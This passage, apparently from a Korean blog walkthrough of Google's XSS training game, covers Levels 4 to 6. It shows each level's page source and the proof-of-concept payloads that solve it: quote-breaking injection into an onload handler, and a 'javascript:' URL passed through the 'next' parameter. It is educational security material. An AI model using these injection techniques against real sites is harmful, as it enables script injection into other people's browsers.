  &lt;/<span style="color:#ff79c6">head</span>&gt;
  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level4&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level4.png&#34;</span> /&gt;
    &lt;<span style="color:#ff79c6">br</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/loading.gif&#34;</span> <span style="color:#50fa7b">onload</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;startTimer(&#39;3&#39;);&#34;</span> /&gt;
    &lt;<span style="color:#ff79c6">br</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;message&#34;</span>&gt;Your timer will execute in 3 seconds.&lt;/<span style="color:#ff79c6">div</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>소스코드를 살펴보니, 입력한 숫자가 그대로 <code>&lt;img src=&quot;/static/loading.gif&quot; onload=&quot;startTimer('3');&quot; /&gt;</code>에 들어간다.
숫자가 그대로 삽입되고, <code>onload</code> 안에 있으므로, Level 3와 유사하게 맞추어 넣어주면 <code>alert</code>를 띄워줄 수 있을 것 같다.
숫자를 입력하는 창에 <code>3'); alert('1</code>를 입력 해 보았다.
이 경우 취약점이 있는 부분은 아래와 같이 된다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/loading.gif&#34;</span> <span style="color:#50fa7b">onload</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;startTimer(&#39;3&#39;); alert(&#39;1&#39;);&#34;</span> /&gt;
</code></pre></td></tr></table>
</div>
</div><p>그 결과 아래와 같이 문제를 풀 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_11.PNG" alt=""></p>
<hr>
<h2 id="level-5">Level 5</h2>
<p>Level 5 문제이다.</p>
<p><img src="/images/xssgame/xssgame_12.PNG" alt=""></p>
<p>Level 5는 회원가입을 하는 페이지처럼 보이는데, 실제로 소스코드를 확인 해 보면, 회원가입을 누른다 해도 입력한 Email 값을 가지고 아무런 행동을 하지 않는다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level5&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level5.png&#34;</span> /&gt;&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
    Thanks for signing up, you will be redirected soon...
    &lt;<span style="color:#ff79c6">script</span>&gt;
      setTimeout(<span style="color:#8be9fd;font-style:italic">function</span>() { <span style="color:#8be9fd;font-style:italic">window</span>.location <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;welcome&#39;</span>; }, <span style="color:#bd93f9">5000</span>);
    &lt;/<span style="color:#ff79c6">script</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>이에 첫 번째 페이지와 Email을 입력하는 페이지의 소스코드를 다시 차근차근 확인 해 보았다.</p>
<ul>
<li>첫 번째 페이지</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level5&#34;</span>&gt;
    Welcome! Today we are announcing the much anticipated&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level5.png&#34;</span> /&gt;&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;

    &lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/level5/frame/signup?next=confirm&#34;</span>&gt;Sign up&lt;/<span style="color:#ff79c6">a</span>&gt; 
    for an exclusive Beta.
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>Email을 입력하는 페이지</li>
</ul>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level5&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level5.png&#34;</span> /&gt;&lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
    <span style="color:#6272a4">&lt;!-- We&#39;re ignoring the email, but the poor user will never know! --&gt;</span>
    Enter email: &lt;<span style="color:#ff79c6">input</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;reader-email&#34;</span> <span style="color:#50fa7b">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;email&#34;</span> <span style="color:#50fa7b">value</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;&#34;</span>&gt;

    &lt;<span style="color:#ff79c6">br</span>&gt;&lt;<span style="color:#ff79c6">br</span>&gt;
    &lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span>&gt;Next &gt;&gt;&lt;/<span style="color:#ff79c6">a</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
&lt;/<span style="color:#ff79c6">html</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>살펴보니 아래의 두 곳을 통해 취약점을 발견할 수 있었다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/level5/frame/signup?next=confirm&#34;</span>&gt;Sign up&lt;/<span style="color:#ff79c6">a</span>&gt;

&lt;<span style="color:#ff79c6">a</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;confirm&#34;</span>&gt;Next &gt;&gt;&lt;/<span style="color:#ff79c6">a</span>&gt;
</code></pre></td></tr></table>
</div>
</div><p>Sign up을 누르면 쿼리스트링으로 <code>next=confirm</code>이 넘어간다.
그 후, Email을 입력하는 화면에선 앞에서 <code>next의 값으로 넘어왔던 confirm</code>이 <code>&lt;a&gt;</code> 태그 안에 그대로 들어있다.
따라서 <code>next</code>의 값으로 <code>confirm</code>이 아니라 <code>alert</code> 창을 띄울 수 있는 코드를 넘긴다면 이번 레벨을 통과할 수 있을 것 같다.</p>
<p>alert 창을 띄우기 위해 confirm 대신에 <code>javascript:alert(1);</code>을 넘겨 보았다.
그 결과 아래와 같이 <code>Next</code>를 누를 경우 <code>javascript:alert(1);</code>이 실행되도록 소스코드가 바뀐 것을 확인할 수 있었다.</p>
<p><img src="/images/xssgame/xssgame_13.PNG" alt=""></p>
<p>이 후 Next 버튼을 누르면 <code>alert</code> 창을 확인할 수 있다.</p>
<p><img src="/images/xssgame/xssgame_14.PNG" alt=""></p>
<hr>
<h2 id="level-6">Level 6</h2>
<p>드디어 마지막 문제인 Level 6이다.</p>
<p><img src="/images/xssgame/xssgame_15.PNG" alt=""></p>
<p>소스코드는 아래와 같다.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html"><span style="color:#ff79c6">&lt;!doctype html&gt;</span>
&lt;<span style="color:#ff79c6">html</span>&gt;
  &lt;<span style="color:#ff79c6">head</span>&gt;
    <span style="color:#6272a4">&lt;!-- Internal game scripts/styles, mostly boring stuff --&gt;</span>
    &lt;<span style="color:#ff79c6">script</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame.js&#34;</span>&gt;&lt;/<span style="color:#ff79c6">script</span>&gt;
    &lt;<span style="color:#ff79c6">link</span> <span style="color:#50fa7b">rel</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;stylesheet&#34;</span> <span style="color:#50fa7b">href</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/game-frame-styles.css&#34;</span> /&gt;

    &lt;<span style="color:#ff79c6">script</span>&gt;
    <span style="color:#8be9fd;font-style:italic">function</span> setInnerText(element, value) {
      <span style="color:#ff79c6">if</span> (element.innerText) {
        element.innerText <span style="color:#ff79c6">=</span> value;
      } <span style="color:#ff79c6">else</span> {
        element.textContent <span style="color:#ff79c6">=</span> value;
      }
    }

    <span style="color:#8be9fd;font-style:italic">function</span> includeGadget(url) {
      <span style="color:#8be9fd;font-style:italic">var</span> scriptEl <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">document</span>.createElement(<span style="color:#f1fa8c">&#39;script&#39;</span>);

      <span style="color:#6272a4">// This will totally prevent us from loading evil URLs!
</span><span style="color:#6272a4"></span>      <span style="color:#ff79c6">if</span> (url.match(<span style="color:#f1fa8c">/^https?:\/\//</span>)) {
        setInnerText(<span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;log&#34;</span>),
          <span style="color:#f1fa8c">&#34;Sorry, cannot load a URL containing \&#34;http\&#34;.&#34;</span>);
        <span style="color:#ff79c6">return</span>;
      }

      <span style="color:#6272a4">// Load this awesome gadget
</span><span style="color:#6272a4"></span>      scriptEl.src <span style="color:#ff79c6">=</span> url;

      <span style="color:#6272a4">// Show log messages
</span><span style="color:#6272a4"></span>      scriptEl.onload <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() { 
        setInnerText(<span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;log&#34;</span>),  
          <span style="color:#f1fa8c">&#34;Loaded gadget from &#34;</span> <span style="color:#ff79c6">+</span> url);
      }
      scriptEl.onerror <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">function</span>() { 
        setInnerText(<span style="color:#8be9fd;font-style:italic">document</span>.getElementById(<span style="color:#f1fa8c">&#34;log&#34;</span>),  
          <span style="color:#f1fa8c">&#34;Couldn&#39;t load gadget from &#34;</span> <span style="color:#ff79c6">+</span> url);
      }

      <span style="color:#8be9fd;font-style:italic">document</span>.head.appendChild(scriptEl);
    }

    <span style="color:#6272a4">// Take the value after # and use it as the gadget filename.
</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">function</span> getGadgetName() { 
      <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">window</span>.location.hash.substr(<span style="color:#bd93f9">1</span>) <span style="color:#ff79c6">||</span> <span style="color:#f1fa8c">&#34;/static/gadget.js&#34;</span>;
    }

    includeGadget(getGadgetName());

    <span style="color:#6272a4">// Extra code so that we can communicate with the parent page
</span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">window</span>.addEventListener(<span style="color:#f1fa8c">&#34;message&#34;</span>, <span style="color:#8be9fd;font-style:italic">function</span>(event){
      <span style="color:#ff79c6">if</span> (event.source <span style="color:#ff79c6">==</span> parent) {
        includeGadget(getGadgetName());
      }
    }, <span style="color:#ff79c6">false</span>);

    &lt;/<span style="color:#ff79c6">script</span>&gt;
  &lt;/<span style="color:#ff79c6">head</span>&gt;

  &lt;<span style="color:#ff79c6">body</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;level6&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/logos/level6.png&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">img</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;cube&#34;</span> <span style="color:#50fa7b">src</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;/static/level6_cube.png&#34;</span>&gt;
    &lt;<span style="color:#ff79c6">div</span> <span style="color:#50fa7b">id</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;log&#34;</span>&gt;Loading gadget...&lt;/<span style="color:#ff79c6">div</span>&gt;
  &lt;/<span style="color:#ff79c6">body</span>&gt;
